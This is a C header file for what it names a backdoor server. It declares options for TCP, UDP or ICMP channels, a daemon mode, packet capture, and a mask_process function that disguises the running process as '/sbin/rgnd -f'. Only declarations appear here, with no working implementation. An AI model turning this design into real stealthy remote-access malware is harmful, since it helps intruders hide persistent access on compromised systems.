#ifndef BACKDOOR_SERVER_H
#define BACKDOOR_SERVER_H

#include "utils.h"
#include "pktcap.h"

#define MASK_NAME "/sbin/rgnd -f"
#define DEFAULT_PORT 8080
#define TRUE 1
#define FALSE 0
#define USER_ROOT 0
#define TCP_PROTOCOL 0
#define UDP_PROTOCOL 1
#define ICMP_PROTOCOL 2

struct options
{
	int daemon_mode;
	int port;
	int protocol;

} user_options;

int start_server();
int parse_options(int argc, char **argv);
void print_server_info();
void mask_process(char **argv);
int start_daemon();

#endif
